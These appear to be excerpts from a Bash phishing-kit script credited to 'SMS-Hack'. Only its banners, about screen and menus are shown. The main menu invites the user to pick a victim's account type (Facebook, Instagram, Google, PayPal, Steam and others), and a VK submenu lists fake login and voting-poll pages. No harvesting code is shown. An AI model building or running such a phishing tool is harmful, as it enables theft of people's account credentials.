...
banner() {
	cat <<- EOF
	${ORANGE}*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★
		${ORANGE} ______   .      .   ______                          ★
		${ORANGE}|         | .  . |   |                               *
		${ORANGE}|______   |  .   |   |_____   == ${ORANGE}HACK                ★
		${ORANGE}       |  |      |        |                          *
		${ORANGE}       |  |      |        |                          ★
		${ORANGE} ______|  |      |   _____|                          *
        ${ORANGE}                                             ★
        ${RED}   LOVE YOU AFGHANISTAN           ${ORANGE}           *
		   ${BLUE}                             ${BLUE}Version : 2.5  ${ORANGE}      ★                             
${ORANGE}*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★
		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Bahar (SMS-Hack)${WHITE}
	EOF
}
...
banner_small() {
	cat <<- EOF
${BLUE} ░SSSSS  MM    MM   SSSSS
${BLUE} ░SS     MMM  MMM SS 
${BLUE} ░SSSSS  MM MM MM  SSSSS ==Hack
${BLUE} ░    SS MM    MM      SS 
${BLUE} ░SSSSS  MM    MM  SSSSS  
${BLUE} ░   love AFGHANISTAN
${BLUE} ░   💀😜😱💪AFG
EOF
}
...
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${GREEN}Author   ${RED}:  ${ORANG} My name is Bahar (SMS-Hack)${RED}[ ${ORANGE}HTR-TECH ${RED}]
		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/sms-kabul-hack
		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/Armankhan armani
		${GREEN}Version  ${RED}:  ${ORANGE}2.5

		${REDBG}${WHITE} Thanks :  To Mr  Basher khan  The Ethical Hacking master
								  i love my country AFG,1RaY-1,AliMilani ${RESETBG}
...
site_facebook() {
	cat <<- EOF
        ${RED} This Tools created by Bahar( SMS-Hack)
...
site_vk() {
	cat <<- EOF
		...
		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page  (SMS-Hack)
		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page   (SMSHack)
...
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${BLUE}[${WHITE}::${RED}]${BLUE} Select An Account For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
		${BLUE}[${WHITE}01${ORANGE}]${RED} Facebook        ${BLUE}[${WHITE}06${ORANGE}]${RED} Microsoft
		${BLUE}[${WHITE}02${ORANGE}]${RED} Instagram       ${BLUE}[${WHITE}07${ORANGE}]${RED} Playstation   
		${BLUE}[${WHITE}03${ORANGE}]${RED} Google          ${BLUE}[${WHITE}08${ORANGE}]${RED} Twitter       
		${BLUE}[${WHITE}04${ORANGE}]${RED} Tiktok          ${BLUE}[${WHITE}09${ORANGE}]${RED} Steam         
		${BLUE}[${WHITE}05${ORANGE}]${RED} Pypal           ${BLUE}[${WHITE}10${ORANGE}]${RED} Microsoft
		${RED}[${WHITE}99${RED}]${ORANGE} About           ${RED}[${WHITE}00${RED}]${ORANGE} Exit
        ${BLUE}[${WHITE}34${RED}]${ORANGE}SMS-Hack 
${BLUE}*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★*★        
	EOF
